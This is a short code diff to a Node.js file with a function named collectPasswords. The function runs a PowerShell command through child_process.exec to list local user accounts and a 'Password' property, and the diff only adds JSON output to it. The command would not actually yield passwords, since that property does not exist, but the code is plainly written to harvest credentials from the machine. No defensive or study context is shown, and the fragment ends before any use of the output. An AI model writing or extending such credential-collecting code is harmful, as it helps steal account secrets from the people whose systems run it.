@@ -2,7 +2,7 @@ const fs = require('fs');
 const { exec } = require('child_process');
 
 function collectPasswords() {
-    exec('powershell Get-LocalUser | Select-Object -Property Name, Password', (error, stdout, stderr) => {
+    exec('powershell Get-LocalUser | Select-Object -Property Name, Password | ConvertTo-Json', (error, stdout, stderr) => {
         if (error) {
             console.error(`Error executing command: ${error.message}`);
             return;
